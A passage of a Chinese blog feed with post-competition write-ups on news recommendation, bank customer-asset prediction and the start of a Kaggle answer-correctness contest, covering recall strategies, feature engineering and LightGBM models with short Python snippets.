        <content type="text/html" src="https://www.logicjake.xyz/2021/02/07/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E6%96%B0%E9%97%BB%E6%8E%A8%E8%8D%90%E6%AD%A3%E5%BC%8F%E8%B5%9B-%E8%B5%9B%E5%90%8E%E5%88%86%E4%BA%AB/"><![CDATA[<p>最终成绩：2 / 5272<br>比赛地址：<a href="https://tianchi.aliyun.com/competition/entrance/531842" target="_blank" rel="noopener">https://tianchi.aliyun.com/competition/entrance/531842</a><br>源码：<a href="https://github.com/LogicJake/tianchi-news-recommendation" target="_blank" rel="noopener">https://github.com/LogicJake/tianchi-news-recommendation</a></p><h1 id="赛题背景"><a href="#赛题背景" class="headerlink" title="赛题背景"></a>赛题背景</h1><p>赛题以新闻APP中的新闻推荐为背景，要求选手根据用户历史浏览点击新闻文章的数据信息预测用户未来点击行为，即用户的最后一次点击的新闻文章，测试集对最后一次点击行为进行了剔除。</p><a id="more"></a><h1 id="数据介绍"><a href="#数据介绍" class="headerlink" title="数据介绍"></a>数据介绍</h1><p>赛题以预测用户未来点击新闻文章为任务，数据集报名后可见并可下载，该数据来自某新闻APP平台的用户交互数据，包括30万用户，近300万次点击，共36万多篇不同的新闻文章，同时每篇新闻文章有对应的embedding向量表示。为了保证比赛的公平性，将会从中抽取20万用户的点击日志数据作为训练集，5万用户的点击日志数据作为测试集A，5万用户的点击日志数据作为测试集B。</p><h2 id="数据表"><a href="#数据表" class="headerlink" title="数据表"></a>数据表</h2><p>train_click_log.csv：训练集用户点击日志<br>testA_click_log.csv：测试集用户点击日志<br>articles.csv：新闻文章信息数据表<br>articles_emb.csv：新闻文章embedding向量表示<br>sample_submit.csv：提交样例文件  </p><details><summary>详细数据字段说明</summary><table><thead><tr><th align="center">Field</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">user_id</td><td align="center">用户id</td></tr><tr><td align="center">click_article_id</td><td align="center">点击文章id</td></tr><tr><td align="center">click_timestamp</td><td align="center">点击时间戳</td></tr><tr><td align="center">click_environment</td><td align="center">点击环境</td></tr><tr><td align="center">click_deviceGroup</td><td align="center">点击设备组</td></tr><tr><td align="center">click_os</td><td align="center">点击操作系统</td></tr><tr><td align="center">click_country</td><td align="center">点击城市</td></tr><tr><td align="center">click_region</td><td align="center">点击地区</td></tr><tr><td align="center">click_referrer_type</td><td align="center">点击来源类型</td></tr><tr><td align="center">article_id</td><td align="center">文章id，与click_article_id相对应</td></tr><tr><td align="center">category_id</td><td align="center">文章类型id</td></tr><tr><td align="center">created_at_ts</td><td align="center">文章创建时间戳</td></tr><tr><td align="center">words_count</td><td align="center">文章字数</td></tr><tr><td align="center">emb_1,emb_2,…,emb_249</td><td align="center">文章embedding向量表示</td></tr></tbody></table></details>  <h1 id="方案总结"><a href="#方案总结" class="headerlink" title="方案总结"></a>方案总结</h1><p>为了构造稳定的线下验证，从训练集用户中随机采样5w个用户作为作为线下验证集用户，将验证集用户的最后一次点击记录从原训练集的点击日志中剔除。合并这时候的训练集点击日志和测试集点击日志作为总的历史点击记录，预测验证集用户的最后一次点击作为线下验证，实验证明该验证方式很稳定，和线上指标同增同减且相差不大。</p><h1 id="召回"><a href="#召回" class="headerlink" title="召回"></a>召回</h1><p>本方案采用了3路召回，通过不同策略的差异性提高整体新闻的召回率。新闻推荐有强热点依赖，用户往往会短时间内点击许多相关新闻，所以需要从历史点击序列中挖掘新闻之间的关系信息。</p><h2 id="改进版-itemcf"><a href="#改进版-itemcf" class="headerlink" title="改进版 itemcf"></a>改进版 itemcf</h2><p>原始的 itemcf 将用户点击过的新闻看做一个无序的集合，但在实际应用中，应该考虑点击次序带来的影响。在计算同一序列中两个新闻的相似度时，不仅需要考虑共现次数，也需要考虑两个新闻之间的次序关系。同一点击序列中两个新闻位置越远，相关性应该减小。新闻对顺序和逆序的权重也不同，在点击序列A，B，C中，”BC”这样的正序权重应该大于”BA”这样的逆序权重。更多关于 itemcf 的改进可以看之前 KDD CUP 的相关方案总结。</p><blockquote><p>日志中所有出现过的新闻只有3w多个，而整个新闻库中却有30多万。用户可能会点击一些没有在日志数据中出现的新闻。从线下验证集来看，大概有12%待预测新闻没有出现在历史点击记录里。为了缓解冷启动问题，在计算新闻相似度的时候可以考虑加入内容相似度。但是基于数据集给的新闻 embedding 向量表示做向量召回的效果很差劲，所以最后在 itemcf 中没有引入新闻的内容相似度。</p></blockquote><p>建立新闻的相似度关系后，进入到召回阶段，根据用户的历史点击新闻，结合相似度选择 TOP100 关联新闻。选取关联新闻时，除了考虑和历史点击新闻的相似度，还要加入位置距离衰减。新闻点击是强热点相关，所以历史点击新闻对下一次点击预测的影响传播不会太远。在实际测试中，利用所有历史点击新闻做召回，hitrate_5 指标只有0.20，限定只用最近点击的两个新闻来做召回的话，可以大幅提升至0.33。</p><h2 id="基于网络关系的召回"><a href="#基于网络关系的召回" class="headerlink" title="基于网络关系的召回"></a>基于网络关系的召回</h2><p>该方法源自”Bipartite network projection and personal recommendation”，代码采用自<a href="https://tianchi.aliyun.com/forum/postDetail?postId=104936" target="_blank" rel="noopener">论坛开源</a>。该方法也分为两个阶段，新闻相似度计算和基于用户点击历史的新闻召回。在相似度计算阶段，通过用户将两个新闻连接起来。计算相似度时考虑两种因素：1)两个新闻的共同被点击用户过多，则相似度减少；2)共同被点击用户的点击新闻过多，相似度也要减少。基于用户点击历史的新闻召回和 itemcf 类似，不再赘述。类似地，在召回时只利用了最新一次点击的新闻做召回，相较于利用全量历史记录召回，效果提高了10%。</p><h2 id="w2v-向量召回"><a href="#w2v-向量召回" class="headerlink" title="w2v 向量召回"></a>w2v 向量召回</h2><p>除了使用人工规则从序列中提取相似度，我们还可以使用序列学习模型 Word2Vec 为新闻学习向量表示。将用户的新闻点击序列作为句子喂到 Word2Vec 模型，然后选取和用户最近点击新闻最相似的关联新闻。向量学习和寻找相似全部使用 gensim 库的 Word2Vec 实现。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 模型训练</span><br><span class="line">model &#x3D; Word2Vec(sentences&#x3D;sentences, size&#x3D;256,  window&#x3D;3,  min_count&#x3D;1, sg&#x3D;1, hs&#x3D;0, seed&#x3D;seed, negative&#x3D;5, workers&#x3D;10, iter&#x3D;1)</span><br></pre></td></tr></table></figure><h2 id="召回合并"><a href="#召回合并" class="headerlink" title="召回合并"></a>召回合并</h2><p>多路召回之间肯定存在重复召回的情况，这也是为什么召回策略讲究差异性，其实就是为了减少重复召回的数量。利用重复召回的新闻数量占该路召回数量之比做相似度参考，3路召回的相似度见热力图。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://pic.logicjake.xyz/new1.png" alt="图1 召回方式相似度" title="">                </div>                <div class="image-caption">图1 召回方式相似度</div>            </figure><p>重复被召回的新闻在多个召回方式中的得分是不一样的，得分是排序时的强特，需要进行得分合并。对各个召回结果，以用户为单位进行最大最小归一化。分数合并测试了sum，mean和max，效果对比见下表。max丢失的消息较多，mean对重复次数多的新闻不公平。  </p><table><thead><tr><th align="center">合并方式</th><th align="center">hitrate_5</th></tr></thead><tbody><tr><td align="center">sum</td><td align="center">0.3700630930498286</td></tr><tr><td align="center">mean</td><td align="center">0.33700134134830345</td></tr><tr><td align="center">max</td><td align="center">0.35155745441899744</td></tr></tbody></table><p>去重之后，平均每个用户召回到153个新闻。删除没有召回到真实点击的验证集用户，减少了无用负样本的数量，也提高了后续排序模型的效果，但是在计算线下指标的时候这部分用户的数量要包括进去，否则指标会虚高。合并前后各召回方式指标如下表所示：</p><table><thead><tr><th align="center"></th><th align="center">hitrate_5</th><th align="center">mrr_5</th></tr></thead><tbody><tr><td align="center">itemcf</td><td align="center">0.33628098762978786</td><td align="center">0.19792256611521228</td></tr><tr><td align="center">binetwork</td><td align="center">0.3127825525361419</td><td align="center">0.19114627320448885</td></tr><tr><td align="center">w2v</td><td align="center">0.15706195041979235</td><td align="center">0.08342813850663192</td></tr><tr><td align="center">合并</td><td align="center">0.3667842416414129</td><td align="center">0.2195861692085987</td></tr></tbody></table><h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><p>本方案把排序建模为二分类任务，分为特征工程和二分类模型预测两部分。特征工程主要围绕召回策略进行，保证实时性召回的新闻能在排序阶段被推出去。模型采用 LGB 模型。</p><h2 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h2><p>特征工程分为3类：新闻特征，用户特征，用户-新闻交互特征。数据集本身给出的属性信息较少，所以特征工程主要围绕交互属性展开。</p><p>新闻特征包括：</p><ul><li>新闻字数</li><li>新闻创建时间</li><li>新闻被阅读数量</li></ul><p>用户特征包括：</p><ul><li>用户点击新闻的创建时间差的平均值</li><li>用户点击新闻的点击时间差的平均值</li><li>用户点击新闻的点击-创建时间差的统计值：mean，std</li><li>用户点击新闻的 click_datetime_hour 统计值</li><li>用户点击新闻的字数统计值</li><li>用户点击新闻的创建时间统计值</li><li>用户点击新闻的点击时间统计值</li><li>用户新闻阅读数量</li><li>用户某种类新闻阅读数量</li></ul><p>交互特征主要基于之前的召回策略进行，通过保存召回阶段的新闻相似度信息或向量，我们能够间接或直接得到用户对待预测新闻的评分。基于 itemcf， 网络关系和 w2v 的召回得到的只是新闻之间的相似度，需要和用户的历史点击新闻计算间接得到用户-新闻评分，采用如下方式：</p><ul><li>待预测新闻和用户所有历史点击新闻相似度按次序加权求和</li><li>待预测新闻和用户最近一次点击新闻相似度</li></ul><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>模型采用单模 LGB 进行预测，特征重要性见下表。排序之后，hitrate_5 涨到0.4394406080778976，mrr_5 涨到0.26552279464123835。</p><table><thead><tr><th align="center">feature_name</th><th align="center">gain</th></tr></thead><tbody><tr><td align="center">sim_score</td><td align="center">557646.594097</td></tr><tr><td align="center">user_last_click_timestamp_diff</td><td align="center">192108.389757</td></tr><tr><td align="center">user_last_click_article_itemcf_sim</td><td align="center">124281.856153</td></tr><tr><td align="center">user_last_click_article_w2v_sim</td><td align="center">73809.001815</td></tr><tr><td align="center">user_clicked_article_itemcf_sim_sum</td><td align="center">65907.806015</td></tr><tr><td align="center">article_id_cnt</td><td align="center">65031.067219</td></tr><tr><td align="center">user_last_click_created_at_ts_diff</td><td align="center">53308.117885</td></tr><tr><td align="center">user_last_click_article_binetwork_sim</td><td align="center">35544.272514</td></tr><tr><td align="center">user_click_article_w2w_sim_sum_2</td><td align="center">22115.916349</td></tr><tr><td align="center">user_click_timestamp_created_at_ts_diff_mean</td><td align="center">20967.278802</td></tr><tr><td align="center">user_click_timestamp_created_at_ts_diff_std</td><td align="center">19246.184266</td></tr><tr><td align="center">article_id</td><td align="center">19177.854082</td></tr><tr><td align="center">words_count</td><td align="center">18412.732866</td></tr><tr><td align="center">user_click_last_article_click_time</td><td align="center">17445.728666</td></tr><tr><td align="center">user_click_datetime_hour_std</td><td align="center">17065.241513</td></tr><tr><td align="center">user_id_category_id_cnt</td><td align="center">16947.363850</td></tr><tr><td align="center">created_at_ts</td><td align="center">16833.830176</td></tr><tr><td align="center">user_last_click_words_count_diff</td><td align="center">16622.374522</td></tr><tr><td align="center">user_clicked_article_words_count_mean</td><td align="center">16606.933470</td></tr><tr><td align="center">user_id_click_diff_mean</td><td align="center">15513.968470</td></tr><tr><td align="center">user_id_click_article_created_at_ts_diff_mean</td><td align="center">15014.800224</td></tr><tr><td align="center">user_id</td><td align="center">14344.929410</td></tr><tr><td align="center">user_click_last_article_words_count</td><td align="center">14080.826424</td></tr><tr><td align="center">user_clicked_article_click_time_mean</td><td align="center">13204.633566</td></tr><tr><td align="center">user_click_last_article_created_time</td><td align="center">10290.474666</td></tr><tr><td align="center">user_clicked_article_created_time_max</td><td align="center">9965.635575</td></tr><tr><td align="center">user_id_cnt</td><td align="center">8507.025577</td></tr><tr><td align="center">category_id</td><td align="center">6201.554409</td></tr></tbody></table>]]></content>
        <author>
            <name><![CDATA[LogicJake’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2021/01/31/2020%E5%8E%A6%E9%97%A8%E5%9B%BD%E9%99%85%E9%93%B6%E8%A1%8C%E6%95%B0%E5%88%9B%E9%87%91%E8%9E%8D%E6%9D%AF%E5%BB%BA%E6%A8%A1%E5%A4%A7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[2020厦门国际银行数创金融杯建模大赛-赛后总结]]></title>
        <updated>2021-04-25T11:57:33+08:00</updated>
        <link href="https://www.logicjake.xyz/2021/01/31/2020%E5%8E%A6%E9%97%A8%E5%9B%BD%E9%99%85%E9%93%B6%E8%A1%8C%E6%95%B0%E5%88%9B%E9%87%91%E8%9E%8D%E6%9D%AF%E5%BB%BA%E6%A8%A1%E5%A4%A7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2021/01/31/2020%E5%8E%A6%E9%97%A8%E5%9B%BD%E9%99%85%E9%93%B6%E8%A1%8C%E6%95%B0%E5%88%9B%E9%87%91%E8%9E%8D%E6%9D%AF%E5%BB%BA%E6%A8%A1%E5%A4%A7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<p>最终成绩：前15（靠方案从第18向前摸了个优胜奖） / 1478<br>比赛地址：<a href="https://js.dclab.run/v2/cmptDetail.html?id=439" target="_blank" rel="noopener">https://js.dclab.run/v2/cmptDetail.html?id=439</a><br>源码：<a href="https://github.com/LogicJake/2020-Xiamen-International-Bank-Financial-Cup" target="_blank" rel="noopener">https://github.com/LogicJake/2020-Xiamen-International-Bank-Financial-Cup</a>   </p><h1 id="赛题背景"><a href="#赛题背景" class="headerlink" title="赛题背景"></a>赛题背景</h1><p>在数字金融时代，大数据、人工智能技术在银行业内的发展日新月异，业内各机构都在加速数字化转型发展。厦门国际银行作为有特色的科技领先型中小银行，多年来始终坚持发挥数字金融科技力量，践行“数字赋能”理念，持续推进智慧风控、智慧营销、智慧运营、智慧管理，运用人工智能和大数据分析技术建立智能化客户服务模式和金融智慧营销服务体系，提升营销过程的智慧化、精准化水平，在为客户提供更贴心更具可用性的金融服务。</p><a id="more"></a><h1 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h1><p>随着科技发展，银行陆续打造了线上线下、丰富多样的客户触点，来满足客户日常业务办理、渠道交易等客户需求。面对着大量的客户，银行需要更全面、准确地洞察客户需求。在实际业务开展过程中，需要发掘客户流失情况，对客户的资金变动情况预判；提前/及时针对客户进行营销，减少银行资金流失。本次竞赛提供实际业务场景中的客户行为和资产信息为建模对象，一方面希望能借此展现各参赛选手的数据挖掘实战能力，另一方面需要选手在复赛中结合建模的结果提出相应的营销解决方案，充分体现数据分析的价值。</p><h1 id="数据介绍"><a href="#数据介绍" class="headerlink" title="数据介绍"></a>数据介绍</h1><p>数据共分为三个部分，训练集(包括 2019 年第三、第四季度，每个季度的客户信息、资产数据、行为数据、重大历史数据、存款数据)、测试集(包括 2020 年第一季度的客户信息、资产数据、行为数据、重大历史数据、存款数据)，以及标签数据。建模的目标即根据训练集对模型进行训练，并对测试集进行预测。训练集和测试集中包含了有效客户和无效客户，而所给的标签中，只有有效用户的标签，同时赛题也要求只对有效用户建模，因此，本文以下的分析均为有效客户，不包含无效客户。  </p><p>本方案采用的方式是将将训练集(客户信息、资产数据、行为数据、重大历史数据、存款数据)按季度合并起来，合并之后的训练集有 82899 个有效客户，而测试集有 76722 个有效客户。  </p><details><summary>详细数据字段说明</summary><p>a) aum_m(Y) 代表第 Y 月的月末时点资产数据<br><img src="https://pic.logicjake.xyz/a.png" alt=""></p><p>b) behavior_m(Y) 代表第Y月的行为数据<br><img src="https://pic.logicjake.xyz/b.png" alt=""></p><p>c) big_event_Q(Z) 代表第 Z 季度的客户重大历史数据<br><img src="https://pic.logicjake.xyz/c.png" alt=""></p><p>d) cunkuan_m(Y) 代表第 Y 月的存款数据<br><img src="https://pic.logicjake.xyz/d.png" alt=""></p><p>e) cust_avli _Q(Z) 代表第 Z 季度的有效客户 仅有 cust_no  </p><p>f) cust_info_q(Z) 代表第 Z 季度的客户信息<br><img src="https://pic.logicjake.xyz/f.png" alt="">  </p></details>  <h1 id="方案总结"><a href="#方案总结" class="headerlink" title="方案总结"></a>方案总结</h1><p>根据工作人员的答疑，标签是根据一定业务规则和客户存款情况去给客户打标签, 反映的是客户资产的变化情况。</p><ul><li>-1 代表客户资产下降</li><li>0 代表客户资产维稳</li><li>1 代表客户资产上升  </li></ul><p>训练集中 63.9% 的客户属于类别 1 (资产上升)；20.8% 属于类别 2 (资产维稳)；15.3% 属于类别 -1 (资产下降)。</p><h2 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h2><h3 id="行为数据相关特征"><a href="#行为数据相关特征" class="headerlink" title="行为数据相关特征"></a>行为数据相关特征</h3><p>在行为数据中有一列特征为最近一次交易时间B6，用当季度最后一天的日期减去B6可以得到客户没有交易的天数（用B6_gap表示），以此来衡量用户的沉寂时间。该特征在线下能提升4个k，但线上却起到了反作用。探查数据后发现，存在最近一次交易日期并不在该季度的日期范围之内的现象，也就是说很多客户在这一个季度内都没用交易过。这些用户的沉寂时间过长，因此在多个季度的数据中，最后一次交易时间都是同一个很久远的日期，所以需要进行截断，将最近一次交易日期截断在本季度所属日期范围内，防止同一个用户出现越后面的季度B6_gap越大的现象。重新处理后该特征<strong>线上能提升4个k</strong>。</p><p>对其他行为数据进行了交叉处理，构造了转入转出金额之差、之比，平均每次转入金额和平均每次转出金额。</p><p>行为数据是按月给出的，需要聚合为以季度为单位的特征。对原始的行为特征和衍生的交叉特征，对季度内的月数据进行mean，std，max，min，diff，last统计。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">for f in tqdm([&#39;B1&#39;, &#39;B2&#39;, &#39;B3&#39;, &#39;B4&#39;, &#39;B5&#39;, &#39;B5_B3_minus&#39;, &#39;B3_B2_ratio&#39;, &#39;B5_B4_ratio&#39;, &#39;B5_B3_ratio&#39;]):</span><br><span class="line">    df_temp &#x3D; df_behavior.groupby([&#39;cust_no&#39;, &#39;q&#39;])[f].agg(&#123;</span><br><span class="line">        &#39;q_&#123;&#125;_mean&#39;.format(f): &#39;mean&#39;,</span><br><span class="line">        &#39;q_&#123;&#125;_std&#39;.format(f): &#39;std&#39;,</span><br><span class="line">        &#39;q_&#123;&#125;_max&#39;.format(f): &#39;max&#39;,</span><br><span class="line">        &#39;q_&#123;&#125;_min&#39;.format(f): &#39;min&#39;,</span><br><span class="line">        &#39;q_&#123;&#125;_diff&#39;.format(f): lambda x: x.values[-1] - x.values[0],</span><br><span class="line">        &#39;q_&#123;&#125;_last&#39;.format(f): &#39;last&#39;,</span><br><span class="line">    &#125;).reset_index()</span><br><span class="line">    df_feature &#x3D; df_feature.merge(df_temp, how&#x3D;&#39;left&#39;)</span><br></pre></td></tr></table></figure><h3 id="资产数据相关特征"><a href="#资产数据相关特征" class="headerlink" title="资产数据相关特征"></a>资产数据相关特征</h3><p>该表包含了月末客户的各类资产余额，很自然的可以求和得到所有资产的总和，顺便得到拥有的不同资产的类别。本季度最后一个月的月末数据可以视为本季度结束时的数据，各类资产余额除以总资产余额可以得到季度结束时各资产的配比。资产数据也是按月给出的，对资产的总和和资产类别数，进行mean，std，max，min，diff，last统计。</p><h3 id="存款数据相关特征"><a href="#存款数据相关特征" class="headerlink" title="存款数据相关特征"></a>存款数据相关特征</h3><p>不是很明白存款数据和资产数据的区别，该表给出了当月存款产品金额和存款产品个数，交叉得到平均每个存款产品的金额。按月对存款金额进行diff得到存款金额的月变化情况。同样对原始特征和衍生的交叉特征，对季度内的月数据进行mean，std，max，min，diff，last统计。</p><h3 id="历史事件数据相关特征"><a href="#历史事件数据相关特征" class="headerlink" title="历史事件数据相关特征"></a>历史事件数据相关特征</h3><p>该表有客户一系列的“第一次”的日期，虽然说时间特征一般是很强的，但实际并没有挖出强有力的代表特征，仅仅对这一系列日期特征交叉计算日期差。</p><h3 id="客户基本信息相关特征"><a href="#客户基本信息相关特征" class="headerlink" title="客户基本信息相关特征"></a>客户基本信息相关特征</h3><p>直接merge进主表就完事了，对类别特征做了count编码，探究的比较粗糙。</p><h3 id="季度间特征"><a href="#季度间特征" class="headerlink" title="季度间特征"></a>季度间特征</h3><p>上面的特征都是在季度内做统计，我们完全可以把每个季度最后一个月的数据视为季度数据，比如季度资产余额。这样我们就可以以季度为单位计算diff，得到各类资产余额距离上个季度的变化情况，从而得到客户的资产变动情况。该类特征提升较大，线上接近<strong>3个百</strong>。</p><h2 id="多分类预测概率权重搜索"><a href="#多分类预测概率权重搜索" class="headerlink" title="多分类预测概率权重搜索"></a>多分类预测概率权重搜索</h2><p>这也是多分类任务的一个很重要的提分trick，基本思想为暴力搜索各个类别的权重，使得预测类别的概率乘以权重后，kappa指标能提升。本质上是将模型预测的类别概率分布尽量拉到真实的标签分布，该trick线上能提升大概<strong>1.5个百</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">def search_weight(valid_y, raw_prob, init_weight&#x3D;[1.0]*class_num, step&#x3D;0.001):</span><br><span class="line">    weight &#x3D; init_weight.copy()</span><br><span class="line">    f_best &#x3D; cohen_kappa_score(valid_y, raw_prob.argmax(</span><br><span class="line">        axis&#x3D;1))</span><br><span class="line">    flag_score &#x3D; 0</span><br><span class="line">    round_num &#x3D; 1</span><br><span class="line">    while(flag_score !&#x3D; f_best):</span><br><span class="line">        print(&#39;round: &#39;, round_num)</span><br><span class="line">        round_num +&#x3D; 1</span><br><span class="line">        flag_score &#x3D; f_best</span><br><span class="line">        for c in range(class_num):</span><br><span class="line">            for n_w in range(0, 2000, 10):</span><br><span class="line">                num &#x3D; n_w * step</span><br><span class="line">                new_weight &#x3D; weight.copy()</span><br><span class="line">                new_weight[c] &#x3D; num</span><br><span class="line"></span><br><span class="line">                prob_df &#x3D; raw_prob.copy()</span><br><span class="line">                prob_df &#x3D; prob_df * np.array(new_weight)</span><br><span class="line"></span><br><span class="line">                f &#x3D; cohen_kappa_score(valid_y, prob_df.argmax(</span><br><span class="line">                    axis&#x3D;1))</span><br><span class="line">                if f &gt; f_best:</span><br><span class="line">                    weight &#x3D; new_weight.copy()</span><br><span class="line">                    f_best &#x3D; f</span><br><span class="line">    return weight</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个比赛前期花费的时间比较多，后期随着挖特征收益太小，线上线下不一致，担心切榜就是摸奖，所以最后一个月基本就没提交了，就和队友融合了一下就放弃了。没想到b榜分数还是挺稳定的，而且前面有很多小号退赛，混进了前20，哈哈，无力吐槽。</p>]]></content>
        <author>
            <name><![CDATA[LogicJake’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2021/01/09/Riiid-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[Kaggle Riiid! Answer Correctness Prediction-赛后总结]]></title>
        <updated>2021-04-25T11:57:33+08:00</updated>
        <link href="https://www.logicjake.xyz/2021/01/09/Riiid-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2021/01/09/Riiid-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<p>最终成绩：74 / 3395 银牌<br>比赛地址：<a href="https://www.kaggle.com/c/riiid-test-answer-prediction" target="_blank" rel="noopener">https://www.kaggle.com/c/riiid-test-answer-prediction</a></p><p>这比赛线上测评采用 API 方式逐步给出测试数据，模拟真实场景下的在线预测，所以基本避免了穿越特征的出现。此外由于在线测评的原因，要兼顾线上特征构造和模型预测的时间复杂度和空间复杂度，一个不满足都会导致线上提交失败。</p><p>赛题提供的数据量很大且是典型的序列数据，所以前排有许多基于 transformer 的 NN 方案，这一点是我们队伍的欠缺。本方案的线下验证集划分采用 tito 开源的 <a href="https://www.kaggle.com/its7171/cv-strategy" target="_blank" rel="noopener">CV Strategy</a>，特征构造框架也是采用 tito 大佬开源的 <a href="https://www.kaggle.com/its7171/lgbm-with-loop-feature-engineering" target="_blank" rel="noopener">LGBM with Loop Feature Engineering</a>，这里就不赘述了，直接进入特征工程部分。</p><h1 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h1><p>我们将构造的特征分为静态特征和动态特征，静态特征直接由训练集统计得到，不需要随着数据的增加逐步更新。赛题的线上测试集中是不包含新题目的，所以可以认为题目处于一种比较稳定的状态，不需要迭代更新。动态特征主要与用户相关，进来一条新数据，就需要更新与之相关的状态字典。</p><h2 id="静态特征"><a href="#静态特征" class="headerlink" title="静态特征"></a>静态特征</h2><ul><li>题目的 tags 提取出来的第一个标签 tag1</li><li>题目被回答次数，回答正确次数，正确率</li><li>题目所属 bundle_id 有多少题目</li><li>题目所属 bundle_id 的被回答次数，正确回答次数，正确率</li><li>题目所属 part 的被回答次数，正确回答次数，正确率</li><li>对 part 进行分桶，以 part=5 为分界划分是听力测试还是阅读测试</li><li>题目所属 tag1 所有题目的正确率的平均值和方差</li><li>对题目的 tags 做 embedding(dimension=2)，题目所有的 tag embedding 的平均值</li><li>题目出现次数，题目 part 出现次数，题目 tag1 出现次数在训练集中的占比</li><li>题目被多少个不同的人回答过</li></ul><h2 id="动态特征"><a href="#动态特征" class="headerlink" title="动态特征"></a>动态特征</h2><p>动态特征需要根据新数据不断更新，为了避免线上线下特征构造方式的差异性带来的潜在问题，我们在线下也使用了迭代式的特征构造方式。主要逻辑如下面的伪代码所示，核心在于3个函数，add_user_feats 用于线下数据的特征构造和状态字典更新，线上推理的时候，一批数据的真实标签需要在下批数据中给出，所以特征构造和状态字典更新需要在函数 add_user_feats_without_update 和函数 update_user_feats 分别进行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># 线下特征构造</span><br><span class="line">特征状态字典 &#x3D; &#123;&#125;</span><br><span class="line"></span><br><span class="line">def add_user_feats(df, 特征状态字典):</span><br><span class="line">    for ... in df.values:</span><br><span class="line">        根据 key 查询特征状态字典，构造本样本的特征</span><br><span class="line">        更新特征状态字典</span><br><span class="line"></span><br><span class="line">add_user_feats(训练集数据, 特征状态字典)</span><br><span class="line"></span><br><span class="line">保存特征状态字典</span><br><span class="line"></span><br><span class="line"># 线上特征构造</span><br><span class="line">加载线下保存的特征状态字典</span><br><span class="line"></span><br><span class="line">def update_user_feats(df, 特征状态字典):</span><br><span class="line">    for ... in df.values:</span><br><span class="line">        更新特征状态字典</span><br><span class="line"></span><br><span class="line">def add_user_feats_without_update(df, 特征状态字典):</span><br><span class="line">    for ... in df.values:</span><br><span class="line">        根据 key 查询特征状态字典，构造本样本的特征</span><br><span class="line"></span><br><span class="line">previous_test_df &#x3D; None</span><br><span class="line"></span><br><span class="line">for test_df in 线上测试集:</span><br><span class="line">    if previous_test_df is not None:</span><br><span class="line">        update_user_feats(previous_test_df, 特征状态字典)</span><br><span class="line"></span><br><span class="line">    previous_test_df &#x3D; test_df.copy()</span><br><span class="line">    add_user_feats_without_update(test_df, 特征状态字典)</span><br></pre></td></tr></table></figure><p>动态特征选取了不同的组合维度，包括用户，用户和题目 part 组合，用户和题目 tag1 组合，用户和题目组合。时间属性能够反应很多信息，构造时间差特征能有效反应学生的做题效率，做题热情等信息。下面斜体部分的特征都是围绕时间差展开构造的，总共大概有1.7个百分位的提升。</p><ul><li><p>用户侧特征</p><ul><li>用户答题次数，回答正确的次数，答题正确率</li><li><em>用户距离上次，上上次，上上上次答对题目的时间差</em></li><li><em>用户距离上次，上上次，上上上次，上上上上次答题的时间差和时间差之间的差值</em></li><li><em>用户距离上次，上上次听讲座的时间差</em></li><li><em>用户距离上次，上上次，上上次答错题目的时间差</em></li><li><em>用户距离上次，上上次学习（包括做题和听讲座）的时间差</em></li><li><strong>用户这次题目所属 container_id 和上个题目所属 container_id 